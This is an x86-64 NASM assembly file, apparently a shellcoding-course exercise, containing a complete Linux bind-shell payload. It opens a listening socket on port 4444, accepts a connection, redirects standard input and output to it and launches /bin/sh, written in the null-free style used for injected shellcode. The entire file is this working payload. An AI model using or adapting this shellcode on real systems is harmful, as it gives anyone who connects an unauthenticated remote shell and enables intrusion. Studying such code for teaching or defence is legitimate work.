; David @InfinitelyManic
; NASM x86-64 assembly code derived from http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/


section .text
        global _start

_start:
        ; sock = socket(AF_INET, SOCK_STREAM, 0)
        ; AF_INET = 2
        ; SOCK_STREAM = 1
        ; syscall number 41

;	xor eax, eax
;	add al, 41
	push byte 41
	pop rax

       ; xor edi, edi
;	add di, 2
	push byte 2
	pop rdi

        ;xor esi, esi
        ;inc rsi
	push byte 1
	pop rsi
	
        xor edx, edx
        syscall

        ; copy socket descriptor to rdi for future use
        mov edi, eax

        ; server.sin_family = AF_INET
        ; server.sin_port = htons(PORT)
        ; server.sin_addr.s_addr = INADDR_ANY
        ; bzero(&server.sin_zero, 8)

        xor eax, eax
        push rax
        mov dword [rsp-4], eax
        mov word [rsp-6], 0x5c11
        mov word [rsp-8], -1            ; 0xffff
        add word [rsp-8], 3             ; -1 + 3  = 2
        sub rsp, 8

        ; bind(sock, (struct sockaddr *)&server, sockaddr_len)
        ; syscall number 49
        ;xor eax, eax
      	;add al, 49
	push byte 49
	pop rax
	

       mov rsi, rsp
        ;xor edx, edx
        ;mov dl, 16
	push byte 16
	pop rdx
        syscall


        ; listen(sock, MAX_CLIENTS)
        ; syscall number 50
        ;xor eax, eax
        ;add al, 50
	push byte 50
	pop rax
        ;mov esi, -1
        ;add esi, 3
	push byte 2
	pop rsi 
        syscall


        ; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
        ; syscall number 43
        xor eax, eax
        add al, 43
        sub rsp, 16
        mov rsi, rsp
        mov byte [rsp-1], 16
        sub rsp, 1
        mov rdx, rsp

        syscall

        ; store the client socket description
        mov r9, rax

        ; close parent

;        xor eax, eax
 ;       mov al, 3
	push byte 3
	pop rax
        syscall
        ; duplicate sockets

        ; dup2 (new, old)
        mov rdi, r9
 ;       xor eax, eax
;        mov al, 33
	push byte 33
	pop rax
        xor esi, esi
        syscall

       ;xor eax, eax
       ; add al, 33
	push byte 33
	pop rax
        ;xor esi, esi
	;add esi, 1
	push byte 1
	pop rsi
        syscall

       ; xor eax, eax
       ; add al, 33
	push byte 33
	pop rax
        ;mov rsi, -1
        ;add esi, 3
	push byte 2
	pop rsi
        syscall


        ; execve

        ; First NULL push

        xor eax, eax
        push rax

        ; push /bin//sh in reverse

        mov rbx, 0x68732f2f6e69622f
        push rbx

        ; store /bin//sh address in RDI
        mov rdi, rsp

        ; Second NULL push
        push rax

        ; set RDX
        mov rdx, rsp
                ; Push address of /bin//sh
        push rdi

        ; set RSI

        mov rsi, rsp

        ; Call the Execve syscall
        add rax, 59
        syscall
